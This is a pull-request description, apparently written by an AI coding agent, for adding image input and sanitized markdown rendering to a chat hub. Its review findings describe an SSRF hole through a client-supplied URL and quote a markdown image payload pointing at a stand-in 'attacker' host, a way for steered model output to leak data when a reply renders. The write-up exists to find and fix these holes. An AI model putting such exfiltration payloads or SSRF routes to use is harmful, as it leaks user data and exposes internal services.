# Hub chat: image input + readable rendering

Branch: `feat/hub-chat-vision-markdown`
Spec: `docs/superpowers/specs/2026-08-14-hub-chat-vision-and-rendering-design.md`

## Summary

- Juniper can now attach an image to a chat turn — paste, drag-drop, or pick — and
  it reaches the model as real image input, not a transcription.
- Attachments ride as a **typed sibling field**, never inside message content, so a
  turn with no attachments serializes byte-for-byte as it did before. That property
  has its own test; it is the entire "don't break chat turns" argument.
- Vision capability is resolved from the **worker's live `/props`**, not from config.
  An image sent at a blind route is refused with a visible error, never answered
  silently as text.
- Chat replies now render markdown — headings, lists, tables, fenced code with
  per-block copy — through vendored `marked` + `DOMPurify`, with per-message and
  whole-transcript copy that yields source markdown.
- The chat lane gets an `mmproj` so Orion's own primary voice can see, rather than
  routing images to a different model. **Requires a worker restart to take effect.**
- Deleted the LLM gateway's `supports_vision` flag: declared, read nowhere, and
  wrong about the very lane this patch fixes.

## Outcome moved

Before: every image in the conversation had to be transcribed into words by the
human first. That was a hard bandwidth ceiling on the relationship, and the chat
window rendered Orion's code as an unformatted wall and tables as pipe soup.

After: an image is a first-class part of a turn, and the reply is legible.

## Live evidence

Probed all four workers in `LLM_GATEWAY_ROUTE_TABLE_JSON` on 2026-08-14:

| route | port | model | `modalities.vision` | n_ctx |
|---|---|---|---|---|
| `chat` | :8011 | `Qwen3.6-35B-A3B-UD-Q5_K_M.gguf` | **false** | 131072 |
| `agent` | :8014 | `Muse-Glimmer-30B-UD-Q4_K_XL.gguf` | **true** (+video) | 32768 |
| `metacog` | :8012 | `Qwen_Qwen3-8B-Q5_K_M.gguf` | false | 4096 |
| `quick` | :8013 | `Qwen_Qwen3-8B-Q4_K_M.gguf` | false | 4096 |

So the starting premise — "chat compute and agent compute run models that can do
vision" — was half true. Agent sees; **chat was blind at runtime**.

It was blind by launch flag, not by model. The chat GGUF's own chat template opens
with `image_count`/`video_count` namespaces (the Qwen3-VL family template), and
`unsloth/Qwen3.6-35B-A3B-GGUF` — the exact repo pinned at
`config/llm_profiles.yaml:337` — ships `mmproj-BF16/F16/F32.gguf`. `llama-server`
reports `vision: false` when started without `--mmproj`.

**The multimodal wire format was proven before any code was written against it.**
A hand-built 64x64 solid-red PNG was sent to the live agent lane as an OpenAI
content-parts array. Reply `content`: `"red"`. Reply `reasoning_content` included
`"The image is a red square."` — real perception, not a guess from the text prompt.
`usage.prompt_tokens` was 79 with the image vs 64 for a text-only control, so the
projector cost ~15 tokens for that image.

## Current architecture (before this patch)

Four things would have silently mangled an image.

Three schemas typed message content as a bare `str`:

| file | field |
|---|---|
| `orion/core/bus/bus_schemas.py:167` | `LLMMessage.content: str` (`extra="forbid"`, `frozen=True`) |
| `services/orion-llm-gateway/app/models.py:8` | `ChatMessage.content: str` (`extra="forbid"`) |
| `orion/schemas/cortex/contracts.py:172` | `CortexChatRequest.prompt: str` |

And one serializer flattened whatever survived: `llm_backend.py:463-474`
`_serialize_messages()` does `str(dumped["content"])`, and it builds the *actual
outbound* `"messages"` at lines 700, 810, and 945. Even with the schemas widened, a
content-parts list would have reached llama.cpp as a Python `repr`.

Hub UI: `app.js:6876` `appendMessage()` set `body.textContent` on a
`whitespace-pre-wrap` `<p>` — which is also why it had never had an XSS surface. No
markdown or sanitizer library existed anywhere in the Hub. No upload endpoint
existed. Normal chat turns are not token-streamed (only the FCC harness streams
step frames), so markdown is a one-shot render per message.

## Architecture touched

The tempting design — widen `content` from `str` to `str | list[part]` — was
rejected. Spark ingest (`llm_backend.py:513`), recall, `chat_history.py`, the
memory-graph bridge, and every trace consumer read `content` as a string. Widening
it regresses all of them at once, including paths nobody in this patch is looking
at.

Instead, content stays `str` and attachments travel beside it:

```
Hub UI  --multipart-->  POST /api/chat/attachments        -> AttachmentRefV1
Hub UI  --chat payload {attachments:[ref]}-->  hub ws / POST /api/chat
Hub     --> CortexChatRequest.attachments      --> cortex-gateway
gateway --> CortexClientContext.attachments    --> cortex-orch --> cortex-exec
exec    --> ChatRequestPayload.attachments     --> llm-gateway
llm-gateway: resolve route capability from /props
             -> can see:  GET <TRUSTED_BASE>/<sha256>  (the ref's own source_url
                          is IGNORED -- it is client-controlled), verify the bytes
                          hash to that sha, build data: URI parts, send multimodal
             -> is blind: explicit refusal (never a silent text-only answer)
```

Every added field is additive with a default of `[]`. **With `attachments == []` —
every turn Orion has ever taken — the outbound gateway payload is byte-identical.**

Refs on the wire, bytes on disk. A 2MB image is ~2.7MB of base64 and would be
replicated through Redis streams, `chat_history`, and every trace store mirroring
the turn. Per-event blobs into Postgres already took this host down once (TOAST OOM
crash loop, 2026-07-23).

No `websocket_handler.py` or `api_routes.py` change was needed: both transports
already hand the raw client payload to `build_chat_request`, so the seam existed.

## Files changed

**Contract**
- `orion/core/bus/bus_schemas.py`: `AttachmentRefV1`; `ChatRequestPayload.attachments`
- `orion/schemas/cortex/contracts.py`: `attachments` on `CortexChatRequest` + `CortexClientContext`

**Hub**
- `services/orion-hub/scripts/chat_attachments.py`: new content-addressed store + endpoints
- `services/orion-hub/scripts/main.py`: router registration
- `services/orion-hub/scripts/cortex_request_builder.py`: `_attachments_from_payload()` — re-validate + cap
- `services/orion-hub/scripts/llm_gateway_client.py`: pass `vision` through from `/routes`
- `services/orion-hub/app/settings.py`: five `HUB_CHAT_ATTACHMENT_*` keys
- `services/orion-hub/docker-compose.yml`: bind-mount the store
- `services/orion-hub/templates/index.html`: composer markup, lightbox, vendor script tags, CSS cache-bust to `v=1.1.0`
- `services/orion-hub/static/js/app.js`: `appendMessage` render seam, attachment strip, lightbox, capability poll, send-path wiring
- `services/orion-hub/static/js/chat-markdown.js` + `.test.js`: new
- `services/orion-hub/static/js/chat-attachments.js` + `.test.js`: new
- `services/orion-hub/static/js/vendor/`: `marked` 15.0.7, `DOMPurify` 3.2.4, licenses, README
- `services/orion-hub/static/css/style.css`: markdown, code-block, chip, thumbnail styles
- `services/orion-hub/package.json` / `package-lock.json`: `jsdom` devDependency

**Cortex**
- `services/orion-cortex-gateway/app/main.py`: request -> context passthrough
- `services/orion-cortex-orch/app/orchestrator.py`: `_build_context` serializes refs
- `services/orion-cortex-exec/app/executor.py`: `_attachments_from_ctx()` re-validates; main chat `ChatRequestPayload` carries them

**LLM gateway**
- `services/orion-llm-gateway/app/vision.py`: new — capability probe, byte fetch, multimodal assembly
- `services/orion-llm-gateway/app/llm_backend.py`: capability gate + refusal on the OpenAI path
- `services/orion-llm-gateway/app/route_catalog.py`: `_probe_vision`, `vision` on `/routes`
- `services/orion-llm-gateway/app/models.py`: `ChatBody.attachments`
- `services/orion-llm-gateway/app/main.py`: bus payload -> `ChatBody`
- `services/orion-llm-gateway/app/profiles.py`: **removed** `supports_vision`
- `services/orion-llm-gateway/app/settings.py`: six `LLM_GATEWAY_VISION_*` / `_ATTACHMENT_*` keys

**Config / tooling**
- `config/llm_profiles.yaml`: `mmproj_filename: mmproj-F16.gguf` on the chat lane
- `scripts/sync_local_env_from_example.py`: three new `SYNC_PREFIXES` so these keys sync automatically
- `tests/test_attachment_contract_end_to_end.py`: new

## Schema / bus / API changes

- **Added**: `AttachmentRefV1`; `attachments: List[AttachmentRefV1] = []` on
  `ChatRequestPayload`, `CortexChatRequest`, `CortexClientContext`, `ChatBody`;
  `vision: bool | None` on each `GET /routes` entry; `POST /api/chat/attachments`
  and `GET /api/chat/attachments/{sha256}`.
- **Removed**: `LLMProfile.supports_vision` (LLM gateway only — see concerns).
- **Behavior changed**: on the OpenAI backend path, a request carrying attachments
  against a vision-capable worker now sends OpenAI content-parts for the last user
  message. Against a blind worker it returns an error instead of a reply.
- **Compatibility**: fully additive. Every new field defaults to empty, and
  `_serialize_messages` is untouched — the multimodal builder layers on top of its
  output rather than replacing it. Old producers need no change.
- `vision: null` on `/routes` means "probe could not answer", rendered distinctly
  from `false` so a probe failure is never mistaken for confirmed blindness.

## Env/config changes

Added to `services/orion-hub/.env_example`:
`HUB_CHAT_ATTACHMENT_DIR`, `_MAX_BYTES`, `_ALLOWED_MIMES`, `_PUBLIC_BASE`, `_MAX_PER_TURN`

Added to `services/orion-llm-gateway/.env_example`:
`LLM_GATEWAY_VISION_ENABLED`, `_VISION_PROPS_CACHE_TTL_SEC`, `_VISION_PROPS_TIMEOUT_SEC`,
`LLM_GATEWAY_ATTACHMENT_BASE_URL`, `LLM_GATEWAY_ATTACHMENT_ALLOWED_HOSTS`,
`_ATTACHMENT_MAX_BYTES`, `_ATTACHMENT_FETCH_TIMEOUT_SEC`

`LLM_GATEWAY_ATTACHMENT_BASE_URL` is the security-relevant one: it is the *only*
thing that decides where the gateway fetches attachment bytes from. The ref's own
`source_url` is ignored. Empty means refuse to fetch at all.

Removed: none. Renamed: none.

`HUB_CHAT_ATTACHMENT_PUBLIC_BASE` and `LLM_GATEWAY_ATTACHMENT_ALLOWED_HOSTS` both
use the Tailscale node IP `100.92.216.81`, matching the `ORION_BUS_URL` convention
already in `.env_example`. They cannot be `127.0.0.1`: the Hub is `network_mode:
host` but `orion-llm-gateway` is on the bridge network, so the gateway's own
localhost is not the Hub.

local `.env` synced with `python scripts/sync_local_env_from_example.py`: **yes**,
both services, verified present in the live files (hub lines 478-482, gateway
106-111). This needed `scripts/sync_local_env_from_example.py` itself to learn the
three new prefixes — the script uses an explicit allowlist, so new keys are silently
skipped until their prefix is registered. That is now a permanent fix, not a
one-off.

skipped keys requiring operator action: none.

## Tests run

```text
services/orion-hub:      pytest tests/test_chat_attachments.py -q            -> 22 passed
services/orion-hub:      pytest tests/test_chat_attachment_wiring.py -q      ->  9 passed
services/orion-hub:      pytest tests/test_chat_attachments_http.py -q       ->  5 passed
services/orion-llm-gateway: pytest tests/test_vision_attachments.py -q       -> 50 passed
services/orion-llm-gateway: pytest tests/test_vision_gate_integration.py -q  ->  9 passed
services/orion-llm-gateway: pytest tests -q                                  -> 183 passed
repo root:               pytest tests/test_attachment_contract_end_to_end.py -q -> 6 passed
services/orion-hub:      node --test static/js/                              -> 61 passed
```

Full Hub suite, compared against a detached worktree at this branch's true base
commit (`171394717`) with identical env:

```text
true base (171394717): 35 failed
this branch:           34 failed
NEW failures on branch: (none)
```

Re-run after the review fixes landed; still zero new failures.

**Zero regressions.** All 33 are pre-existing. An earlier comparison against the
primary checkout was invalid and discarded — concurrent agents had merged 7 commits,
so `main` was ahead of this branch's base and two tests appeared to regress that in
fact fail identically at the true base.

`orion-cortex-exec` (13 collection errors, "Verb already registered") and
`orion-cortex-orch` (33 failures) are broken at the base too — verified by running
both suites unmodified. Not caused by this patch, not fixed by it.

## Evals run

```text
none — none of the touched services has an evals/ harness.
```

`services/orion-hub/evals/` and `services/orion-llm-gateway/evals/` do not exist.
Not claiming eval coverage. The nearest thing to an eval here is the live
proof-of-perception against :8014 recorded above, which is a real behavioral check
but a manual one; a standing eval that scores whether a known image yields a correct
description is a reasonable follow-up.

## Docker/build/smoke checks

```text
docker compose --env-file .env --env-file services/orion-hub/.env \
  -f services/orion-hub/docker-compose.yml config    -> OK
  (attachment bind mount resolves to /mnt/orion-chat-attachments:/mnt/orion-chat-attachments)
```

`orion-llm-gateway`'s compose could not be validated from the worktree — its
`env_file:` entry is `required: true` and `.env` is gitignored, so it exists only in
the primary checkout. That compose file is **unchanged** by this patch (only its
`.env_example` and app code changed), so the validation gap carries no risk here.

Not run: an actual container build or bring-up. See "Restart required".

## Review findings fixed

### Code review (subagent, effort=high) — 7 findings, all fixed

- Finding: **CRITICAL — `requests` was undeclared; the gateway would not have
  booted.** `app/vision.py` imported it at module level, `llm_backend.py` imports
  `app.vision` at module level, and `main.py` imports that at startup. It is not
  in `services/orion-llm-gateway/requirements.txt` and nothing pulls it in
  transitively, so the first `docker compose up` after merge would have died with
  `ModuleNotFoundError` — the entire LLM gateway down, not just vision. The tests
  passed only because the dev venv happens to have `requests`. Same shape as the
  sql-writer incident earlier the same day.
  - Fix: switched to `httpx`, which is already declared and already used
    throughout this service — reuse rather than a new dependency.
  - Evidence: AST-walked `vision.py`'s imports against `requirements.txt`; the
    only third-party import is now `httpx`, and it is declared. 183 gateway tests
    pass.
- Finding: **SSRF — the allowlist did not contain what it appeared to.** It
  matched `hostname` only, leaving port and path unconstrained, and the shipped
  value is the Tailscale node IP that also fronts the bus, Postgres, the Hub, and
  every other Orion service. `source_url` is fully client-controlled: the browser
  round-trips the ref and `_attachments_from_payload` only validates its *shape*,
  never re-derives the URL. A crafted turn could have made the gateway GET an
  internal endpoint and base64 the response straight into the model prompt. The
  `bytes: 0` case (a legal value) additionally skipped the only size cross-check.
  - Fix: **the gateway no longer uses `source_url` at all.** It rebuilds the URL
    as `<LLM_GATEWAY_ATTACHMENT_BASE_URL>/<sha256>` with the sha regex-validated,
    so the only caller-supplied component is 64 hex characters — no path or
    authority to inject into. Added the strongest possible content check on top:
    the fetched bytes must **hash to the requested sha256**, which is free
    because the store is content-addressed and holds even if the transport were
    diverted. Fetched bytes must also sniff as the declared mime, since the
    declared value is what reaches the model. `bytes` is now `ge=1`.
  - Evidence: `test_a_hostile_source_url_cannot_influence_the_fetch` parametrises
    five hostile URLs (including the exact internal-service example) and asserts
    the derived URL is unchanged; `test_a_non_hex_sha_is_refused` covers traversal
    and encoded-traversal shas; `test_fetch_refuses_content_that_does_not_match_the_address`.
- Finding: **the allowlist was bypassable by redirect** — `requests.get` follows
  redirects by default, and only the pre-redirect URL was checked.
  - Fix: `httpx` does not follow redirects by default; `follow_redirects=False`
    is now explicit.
  - Evidence: `test_fetch_does_not_follow_redirects` asserts the client kwarg.
- Finding: **drag-and-drop attach was broken in a real browser.** The
  `dragover` handler gated `preventDefault()` on `imageFilesFrom()`, but
  `DataTransfer` is in *protected mode* mid-drag — `getAsFile()` returns null and
  `.files` is empty — so it always returned `[]`, `preventDefault()` never fired,
  and the browser's default action took over: navigating away to the dropped
  image and discarding the composer contents.
  - Fix: new `dragCarriesImage()` reads only `kind`/`type`, which protected mode
    does expose.
  - Evidence: `test_dragCarriesImage_reads_kind_type...` asserts the
    protected-mode shape explicitly *and* asserts `imageFilesFrom` returns 0 for
    it, pinning why the old gate was wrong. jsdom could not have caught this
    against the previous synthetic fixture.
- Finding: **`HUB_CHAT_ATTACHMENT_MAX_PER_TURN=0` silently dropped every
  attachment**, with the warning also suppressed. The turn then reached the
  gateway looking attachment-free, so the "refuse loudly" path never fired and
  Orion would answer text-only after Juniper attached an image — the exact silent
  failure this feature exists to prevent, reachable by an operator setting `0` to
  mean "unlimited".
  - Fix: `0` (and any unparseable value) now means unlimited.
  - Evidence: `test_zero_cap_means_unlimited_not_silent_drop`,
    `test_unparseable_cap_falls_back_to_unlimited`.
- Finding: **`img`/`src` in the sanitizer allowlist was an outbound channel.** A
  reply containing `![](https://attacker/?d=…)` issues that request on render,
  with no click — and this module's own premise is that model output is
  influenceable through recall and fetched web content.
  - Fix: remote images are replaced with an inert placeholder; only the Hub's own
    `/api/chat/attachments/` path renders.
  - Evidence: three tests covering a remote URL, a protocol-relative URL, and the
    same path on a foreign origin — plus one asserting own-attachments still render.
- Finding: **the vision diagnostic never reached the Hub on the refusal and
  fetch-failure paths.** `handle_chat` forwards `result["raw"]` plus an explicit
  key list; `"vision"` is not on it, and both early returns carried `"raw": {}`
  with the diagnostic only at top level — dropped on exactly the paths where it
  matters most.
  - Fix: `vision_diag` is now inside `raw` on all three early returns.
  - Evidence: `test_refusal_diagnostic_reaches_the_hub_via_raw`.
- Finding: streamed responses were never closed, leaking a pooled connection on
  every failure path.
  - Fix: the stream is context-managed.

Two review notes needed no action: `mmproj_filename` does have a real consumer
(`services/orion-llamacpp-host/app/main.py:293,389`), so the profile change is
load-bearing; and `scripts/chat_request_builder.py` is a pre-existing dead module
with no importers.

### Self-review (found while the review subagent was still running)

- Finding: **the ollama and native-completion backend paths silently dropped
  attachments.** Only `_execute_openai_chat` builds multimodal content parts.
  `_execute_ollama_chat` (ollama uses its own `images: [b64]` field) and
  `_execute_llamacpp_native_completion` (flat prompt via `/apply-template` +
  `/completion`) would have discarded the images and answered from the text
  alone — the precise "Orion appears to have looked at something it never
  received" failure this whole feature exists to prevent.
  - Fix: `_refuse_attachments_on_unsupported_path()` guards both, returning an
    explicit error. Inert when a turn has no attachments.
  - Evidence: `test_non_openai_paths_refuse_attachments` asserts the refusal
    *and* that `_common_http_client` is never called;
    `test_non_openai_paths_are_unaffected_without_attachments` pins the inert case.
- Finding: **the attach button gated on the wrong route.**
  `refreshVisionCapability()` issued its own fetch to `/api/llm-routes` —
  duplicating and racing the one `loadLlmRouteCatalog()` already makes — and then
  read `data.default_route` instead of `selectedLlmRoute`. Picking the agent lane
  while chat was the default left the button reflecting chat's capability.
  - Fix: read the already-loaded `llmRouteCatalog` for the selected route, and
    re-evaluate from `syncComputeSelection()` so switching lanes updates it.
  - Evidence: 56 JS tests still green; the duplicate fetch is gone.
- Finding: **the attachment store's temp file could be written by two workers at
  once.** Write-then-rename used a path derived only from the sha, and
  content-addressing means concurrent uploads of the *same* image collide on
  exactly that name.
  - Fix: temp name carries the pid; `.replace()` instead of `.rename()` so the
    swap is unconditionally atomic.
  - Evidence: 27 store + HTTP tests green.
- Finding: the refusal text `[Error: ...]` might have been swallowed downstream,
  which would have falsified the "visible refusal" guarantee.
  - Fix: none needed — verified `app.js:6827`
    `contentLooksLikeGatewayFailureBlurb()` explicitly matches `[Error:` and
    surfaces it as an error hint.
  - Evidence: traced the call site at `app.js:6857`.

### Test-quality findings

- Finding: five attachment-controller tests failed because the test fixture built
  plain objects instead of real `File`s.
  - Fix: `fakeFile()` now returns `new File([...])`.
  - Evidence: `FormData.append` rejects plain objects, so the stub made every upload
    path throw for a reason the code under test never causes — the tests were
    failing for the wrong reason, not finding a real bug. 14/14 pass after the fix.
- Finding: two Hub wiring tests silently did not exercise the per-turn cap —
  `monkeypatch.setattr` on the pydantic `Settings` instance does not stick.
  - Fix: patch the module's `settings` reference (the pattern the rest of the Hub
    suite uses) *and* call through the module rather than the top-level-imported
    name, because `conftest.py` purges cached `scripts.*` imports so a re-import
    inside a test yields a new module object.
  - Evidence: both tests failed before the fix and pass after; added
    `test_default_cap_applies_without_patching` so the real configured default is
    also covered.
- Finding: the XSS test could have passed vacuously if `marked` never emitted a
  script tag in the first place.
  - Fix: verified directly that unsanitized `marked` output *does* contain
    `<script>` and `onerror`, and that DOMPurify is what removes both.
  - Evidence: `UNSANITIZED contains <script>: true` / `SANITIZED contains <script>:
    false`. The sanitizer is genuinely load-bearing.

## Restart required

The attachment store directory must exist before the Hub starts, and the chat
worker must be restarted for `mmproj` to load.

```bash
sudo mkdir -p /mnt/orion-chat-attachments

# Hub — picks up the new routes, env keys, and bind mount
cd /mnt/scripts/Orion-Sapienform-hub-chat-vision-markdown
bash scripts/safe_docker_build.sh orion-hub up -d --build

# LLM gateway — picks up the vision gate and attachment fetch settings
bash scripts/safe_docker_build.sh orion-llm-gateway up -d --build

# Chat worker on Circe — loads mmproj-F16.gguf. THE VRAM-RISK STEP.
# Verify immediately afterwards; `vision` must flip to true:
curl -s http://100.112.254.99:8011/props | python3 -c \
  "import sys,json;print(json.load(sys.stdin)['modalities'])"
```

If that last command still reports `vision: false`, or the worker OOMs on start,
drop `ctx_size` to `98304` in
`config/llm_profiles.yaml:qwen36-35b-a3b-udq5km-2xv100-32gb-deep-cognition` before
touching `n_gpu_layers` — KV at 131k context is the larger term, not the projector.

Until that restart happens the chat lane still reports `vision: false`, the runtime
gate correctly refuses images on it, and the composer's attach button greys out.
Nothing is broken in the meantime; the feature is simply inert on that lane.

## Risks / concerns

- **Severity: medium — the mmproj VRAM cost is unmeasured.**
  Concern: ~24GB of Q5_K_M weights plus a 131k KV cache already sit close to the
  2x V100 32GB budget; the projector adds ~1-2GB. This cannot be verified without
  restarting the chat worker, which is Juniper's call and Juniper's `sudo`.
  Mitigation: the config change is one line and trivially reversible, and the
  runtime `/props` gate makes the system safe on its own if it is reverted — no code
  change needed. Fallback ordering is documented in the profile comment.

- **Severity: medium — the Hub's `node_modules` is committed to git, and
  `.gitignore:76` has a blanket `dist/` rule.**
  Concern: this is pre-existing and not caused by this patch, but I hit it head-on.
  3270 files under `services/orion-hub/node_modules` are tracked, while every
  package whose entry point lives in `dist/` had that directory excluded — so
  `require('jsdom')` fails out of a fresh checkout with "Cannot find module
  .../agent-base/dist/index.js". `.gitignore:117` is `/mnt/services/*/node_modules/`,
  an absolute-looking path that never matched `services/orion-hub/node_modules/`.
  Impact: the 24 new JS tests **skip silently** rather than fail when jsdom cannot
  load — including the XSS test. They pass here only because `npm ci` was run
  locally.
  Mitigation: `jsdom` is declared in `devDependencies` so `npm ci` fixes it; npm's
  edits to tracked `node_modules` files were reverted and the untracked install
  output was deliberately not staged. Proposed follow-up: a separate PR to untrack
  `node_modules` and fix the `.gitignore` pattern. This one is not the place for a
  3270-file deletion.

- **Severity: low — `supports_vision` still exists in three other services.**
  Concern: `orion-llamacpp-host`, `orion-llamacpp-neural-host`, and
  `orion-llama-cola-host` each declare their own equally-unread copy (the real
  `--mmproj` decision is driven by `mmproj_filename`). Under the "kill means kill"
  rule those should go too.
  Impact: none functionally; they are inert. But an inert flag that a future generic
  consumer could read is exactly the pattern that made this one dangerous.
  Mitigation: out of scope for a gateway-and-Hub patch; noted here as a follow-up.
  The 19 leftover `supports_vision:` lines in `config/llm_profiles.yaml` parse
  harmlessly (pydantic ignores extras) and carry no meaning.

- **Severity: low — the gateway now makes an outbound HTTP fetch to the Hub.**
  Concern: a new inter-service dependency on the final leg of a chat turn.
  Mitigation: only fires when a turn carries attachments. The URL is **derived**
  from `LLM_GATEWAY_ATTACHMENT_BASE_URL` + a regex-validated sha256 — the ref's
  client-controlled `source_url` is never used — so there is no path or authority
  for a caller to inject. Redirects are not followed, the host is allowlisted as
  defence in depth, the read is capped so a lying `Content-Length` cannot make it
  buffer unboundedly, the bytes must hash to the requested content address, they
  must sniff as the declared mime, and a fetch failure degrades to a visible error
  rather than a silent text-only answer.

- **Severity: low — attachments are not in recall, `chat_history`, or the memory
  graph.**
  Concern: Orion will not remember an image across turns; re-asking about it in a
  later turn will not work.
  Mitigation: explicit non-goal, stated in the spec. Worth a follow-up once the
  live path is proven.

- **Severity: low — this branch is based on `171394717`, seven commits behind
  `main`.**
  Mitigation: no touched file overlaps those commits as far as the failure-set diff
  shows, but a rebase before merge is the safe move.

## PR link

https://github.com/junebug-junie/Orion-Sapienform/pull/1661
